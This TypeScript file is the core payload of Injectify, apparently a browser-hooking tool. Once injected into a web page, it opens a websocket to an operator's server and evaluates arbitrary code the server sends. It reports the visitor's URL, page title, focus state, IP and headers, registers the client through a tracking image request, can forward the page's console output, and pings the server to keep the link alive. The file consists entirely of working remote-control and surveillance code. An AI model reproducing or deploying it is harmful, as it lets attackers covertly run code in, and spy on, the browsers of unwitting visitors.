import { Injectify } from '../definitions/core'
declare let ws, require, client, process: any
// Components
import WindowInjection from './components/WindowInjection'
import Decycle from './lib/JSON-Decycle'
import instanceOf from './lib/InstanceOf'
import LoadJS from './lib/LoadJS'
const Guid = require('guid')

/**
 * Injectify core API
 * @class
 */
window['injectify'] = class Injectify {
	static listener(callback: Function) {
		ws.onmessage = message => {
			try {
				let data = JSON.parse(message.data)
				if (this['listeners'] && data.t && this['listeners'][data.t]) {
					/**
					 * Pre-process some topic's data
					 */
					if (data.t == 'pong') {
						data.d = +new Date - data.d
					}
					/**
					 * Callback the listeners
					 */
					this['listeners'][data.t].callback(data.d)
					if (this['listeners'][data.t].once) delete this['listeners'][data.t]
				} else {
					callback(data.d, data.t)
				}
			} catch(e) {
				if (this.debug) console.error(e)
				this.error(e.stack)
			}
		}
	}

	static listen(topic: string, callback, once?: boolean) {
		if (!once) once = false
		if (!this['listeners']) this['listeners'] = {}
		this['listeners'][topic] = {
			callback: data => {
				callback(data)
			},
			raw: callback,
			once: once
		}
	}

	static unlisten(topic: string, callback?: any) {
		/**
		 * If the listener is missing, return false
		 */
		if (!this['listeners'] ||
			!this['listeners'][topic] ||
			!this['listeners'][topic].callback ||
			!this['listeners'][topic].raw ||
			(
				callback &&
				callback.toString() !== this['listeners'][topic].raw.toString()
			)
		) return false
		return delete this['listeners'][topic]
	}

	static send(topic: string, data?: any) {
		/**
		 * If the websocket is dead, return
		 */
		if (ws.readyState == 0) return
		try {
			// @ts-ignore
			ws.send(JSON.stringify(new Decycle({
				t: topic,
				d: data,
			})))
		} catch(e) {
			if (this.debug) console.error(e)
			this.error(e.stack)
		}
	}

	static log(message: any) {
		injectify.send('l', {
			type: 'info',
			message: Array.prototype.slice.call(arguments)
		})
	}
	static error(message: any) {
		injectify.send('l', {
			type: 'error',
			message: Array.prototype.slice.call(arguments)
		})
	}
	static warn(message: any) {
		injectify.send('l', {
			type: 'warn',
			message: Array.prototype.slice.call(arguments)
		})
	}
	static result(message: any) {
		let type = instanceOf(message)
		injectify.send('l', {
			type: 'return',
			message: {
				type: type,
				data: message
			}
		})
	}

	static ping(callback?: any) {
		this.send('ping', + new Date())
		if (callback) this.listen('pong', callback, true)
	}

	static exec(func, element: any = document.head) {
		if (this.info.platform === 'browser') {
			/**
			 * Turn the function into a self-executing constructor
			 */
			if (typeof func === 'function') func = '(function(){' + func.toString() + '})()'
			/**
			 * Create, append & remove a script tag
			 */
			var script = document.createElement('script')
			script.innerHTML = func
			element.appendChild(script)
			element.removeChild(script)
		} else {
			if (typeof func === 'string') {
				eval(`(${func})()`)
			} else {
				func()
			}
		}
	}

	static module(name: string, params?: any) {
		// @ts-ignore
		return new Promise((resolve, reject) => {
			let token = Guid.create()
			/**
			 * Add the Promise references
			 */
			injectify.setState({
				modules: {
					...injectify.global.modules,
					callbacks: {
						...injectify.global.modules.callbacks,
						[token]: {
							resolve: resolve,
							reject: reject
						}
					}
				}
			})
			/**
			 * Emit to server
			 */
			this.send('module', {
				name: name,
				token: token,
				params: params
			})
		})
	}

	static app(name: string, params?: any) {
		// @ts-ignore
		return new Promise((resolve, reject) => {
			let type = 'production.min.js'
			if (this.debug) type = 'development.js'
			LoadJS([
				`https://cdnjs.cloudflare.com/ajax/libs/react/16.2.0/umd/react.${type}`,
				`https://cdnjs.cloudflare.com/ajax/libs/react-dom/16.2.0/umd/react-dom.${type}`
			]).then(() => {
				this.module(name, params).then(resolve).catch(reject)
			}).catch(error => {
				this.error(error)
				reject(error)
			})
		})
	}

	static auth(token?: string) {
		let auth = new Image
		if (token) {
			auth.src = `${this.info.server.url}/a?id=${encodeURIComponent(this.info.id && this.info.id.toString())}&token=${encodeURIComponent(token)}&z=${+new Date}`
		} else {
			/**
			 * Send a connection request to the server
			 *
			 * 1. Make a request to /a with our socket connection ID
			 * 2. Server reads cookies and attempts to find our token
			 * 3. If it can't be found it, the server sets a new cookie
			 * 4. Server gets the passed socket ID and inserts us into database
			 * 5. All this is done server-side with the below two lines
			 */
			auth.src = `${this.info.server.url}/a?id=${encodeURIComponent(this.info.id && this.info.id.toString())}&z=${+new Date}`
		}
		/**
		 * Make sure request is sent
		 */
		auth.onload
	}

	static get present(): boolean {
		return true
	}

	static get info(): Injectify.info {
		/**
		 * Read the project name from the URL
		 */
		var project = ws.url.split('?')[1]
		if (this.debug) project = project.substring(1)
		/**
		 * Parse the server URL from the websocket url
		 */
		var server = ws.url.split('/')
		var protocol = 'https://'
		if (server[0] === 'ws:') protocol = 'http://'
		server = protocol + server[2]

		return {
			'project'    : atob(project),
			'server': {
				'websocket': ws.url,
				'url'      : server
			},
			'id'		 : client.id,
			'platform'   : client.platform,
			'duration'   : this.duration,
			'debug'      : this.debug,
			'os'		 : client.os,
			'ip'         : client.ip,
			'headers'    : client.headers,
			'user-agent' : client.agent
		}
	}

	static get sessionInfo(): Injectify.sessionInfo {
		if (this.info.platform === 'browser') {
			/**
			 * Get the correct document.hidden method
			 */
			let hidden = 'hidden'
			if ('mozHidden' in document) {
				hidden = 'mozHidden'
			} else if ('webkitHidden' in document) {
				hidden = 'webkitHidden'
			} else if ('msHidden' in document) {
				hidden = 'msHidden'
			}
			/**
			 * Return object
			 */
			return {
				window: {
					url: window.location.href,
					title: document.title ? document.title : window.location.host + window.location.pathname,
					active: !document[hidden],
				}
			}
		} else {
			return {
				window: {
					url: eval(`require('file-url')(process.cwd())`),
					title: process.cwd(),
					active: true,
				}
			}
		}
	}

	static sendSession() {
		let sessionInfo = injectify.sessionInfo
		this.debugLog('session-info', 'debug', 'Delivered current state to server')
		this.send('i', sessionInfo)
	}

	static get debug(): boolean {
		return ws.url.split('?')[1].charAt(0) == "$"
	}

	static debugLog(internalName: string = 'generic', level: 'info' | 'debug' | 'warn' | 'error' = 'debug',  ...message: any[]): void {
		if (!this.debug) return
		let emoji = '📝'
		if (internalName === 'core') emoji = '⚡️'
		if (internalName === 'module') emoji = '📦'
		if (internalName === 'window-injection') emoji = '💉'
		if (internalName === 'session-info') emoji = '🕵🏼'

		message.unshift(`${emoji} [${internalName.split('-').join(' ').replace(/\w\S*/g, function(txt){return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();})}]:`)

		if (internalName === 'core') {
			message = [`%c %c${emoji} Injectify core.ts loaded! => https://github.com/samdenty99/injectify`, `padding: 3px 10px; line-height: 20px; background: url("https://github.com/samdenty99/injectify/blob/master/assets/injectify.png?raw=true"); background-repeat: no-repeat; background-size: 20px 20px; color: transparent;`, ``, injectify.info]
		}
		console[level].apply(this, message)
	}

	static get duration(): number {
		let duration = (+new Date - this['connectTime']) / 1000
		return Math.round(duration)
	}

	static get global(): Injectify.global {
		if (!window['inJl1']) window['inJl1'] = {
			listeners: {
				visibility: false,
				timed: {
					active: false
				}
			},
			windowInjection: false,
			commandHistory: [],
			modules: {
				states: {},
				callbacks: {}
			}
		}
		return window['inJl1']
	}

	static setState(newState: any) {
		this.global
    Object.keys(newState).forEach(state => {
      window['inJl1'][state] = newState[state]
    })
  }

	static console(state?: boolean) : 'hooked' | 'unhooked'  {
		if (!state && console['hooked']) {
				console['unhook']()
				return 'unhooked'
		} else if (!console['hooked']) {
			((Console) => {
				// @ts-ignore
				window['console'] = {
					...Console,
					Console: Console,
					log() {
						Console.log.apply(this, arguments)
						injectify.log.apply(this, arguments)
					},
					info() {
						this.log.apply(this, arguments)
					},
					warn() {
						Console.warn.apply(this, arguments)
						injectify.warn.apply(this, arguments)
					},
					error() {
						Console.error.apply(this, arguments)
						injectify.error.apply(this, arguments)
					},
					unhook() {
						console = Console
					},
					hooked: true
				}
			})(console)
			return 'hooked'
		}
	}
}
/**
 * Create local reference to window.injectify
 */
let injectify: typeof Injectify = window['injectify']

// @ts-ignore
let global = injectify.global
window['global'] = global

/**
 * Set the connect time
 */
injectify.connectTime = +new Date

/**
 * Debug helpers
 */
injectify.debugLog('core', 'warn', 'Injectify core.ts loaded! => https://github.com/samdenty99/injectify', injectify.info)

/**
 * Window injection
 */
if (!global.windowInjection) new WindowInjection()

/**
 * Send session info to the Injectify server
 */
injectify.sendSession()


/**
 * Replace the basic websocket handler with a feature-rich one
 */
injectify.listener((data, topic) => {
	try {
		if (topic == 'stay-alive') {
			return
		}
		if (topic == 'error') {
			injectify.exec('console.error(' + JSON.stringify(data) + ')')
			return
		}
		if (topic == 'module') {
			/**
			 * Create the module object
			 */
			var Module = {
				name: data.name,
				token: data.token,
				resolve: (data?: any) => {
					Module.resolved = true
					if (injectify.global.modules.callbacks[Module.token]) {
						injectify.global.modules.callbacks[Module.token].resolve(data)
					} else {
						injectify.debugLog('module', 'error', `Failed to find injectify.global.modules.callbacks[${Module.token}], could not resolve Promise`)
					}
				},
				reject: (data?: any) => {
					Module.resolved = true
					if (injectify.global.modules.callbacks[Module.token]) {
						injectify.global.modules.callbacks[Module.token].reject(data)
					} else {
						injectify.debugLog('module', 'error', `Failed to find injectify.global.modules.callbacks[${Module.token}], could not reject Promise`)
					}
				},
				resolved: false,
				setState: (newState) => {
					injectify.setState({
						modules: {
							...injectify.global.modules,
							states: {
								...injectify.global.modules.states,
								[data.name]: newState
							}
						}
					})
				},
				get state() {
					return injectify.global.modules.states[data.name]
				}
			}

			if (!data.error) {
				/**
				 * Evaluate the script
				 */
				eval(data.script)

				/**
				 * Display verbose output
				 */
				injectify.debugLog('module', 'warn', `Executed module "${Module.name}"`, Module)
			} else {
				if (data.error.message) injectify.error(`📦 ${data.error.message}`, Module)
				Module.reject(data.error.message)
			}
		}
		if (topic == 'execute') {
			(() => {
				let history = injectify.global.commandHistory
				history.push(data)
				injectify.setState({
					commandHistory: history
				})
			})()
			injectify.result(eval(data))
		}
		if (topic === 'core') {
			eval(data)
		}
	} catch(e) {
		if (injectify.debug) console.error(e)
		injectify.error(e.stack)
	}
});

/**
 * Page Visibility API
 */
(() => {
	if (injectify.info.platform === 'browser') {
		/**
		 * Make sure it's not already listening
		*/
		if (global.listeners.visibility) return
		/**
		 * Set a global variable to prevent listener from being called multiple times
		*/
		global.listeners.visibility = true

		let listener
		let focusChange = () => injectify.sendSession()

		/**
		 * Get the correct hidden listener
		 */
		if ('hidden' in document) {
			listener = 'visibilitychange'
		} else if ('mozHidden' in document) {
			listener = 'mozvisibilitychange'
		} else if ('webkitHidden' in document) {
			listener = 'webkitvisibilitychange'
		} else if ('msHidden' in document) {
			listener = 'msvisibilitychange'
		} else {
			window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange
		}
		/**
		 * Add listener
		 */
		if (listener) document.addEventListener(listener, focusChange)
	}
})();

/**
 * Console.log overrider
 */
// injectify.console(true);

/**
 * Session info logger
 */
(() => {
	if (global.listeners.timed.active) {
		return
	} else {
		global.listeners.timed.active = true;
		(function sessionInfo() {
			let currentState = JSON.stringify(injectify.sessionInfo)
			if (currentState !== global.listeners.timed.prevState) {
				/**
				 * If the previous state was defined
				 */
				if (global.listeners.timed.prevState) injectify.sendSession()
				global.listeners.timed.prevState = currentState
			}
			setTimeout(sessionInfo, 1000)
		})()
	}
})()

/**
 * Ping the server every 5 seconds to sustain the connection
 */
clearInterval(window['ping'])
window['ping'] = setInterval(() => {
	injectify.send('heartbeat')
}, 10 * 1000)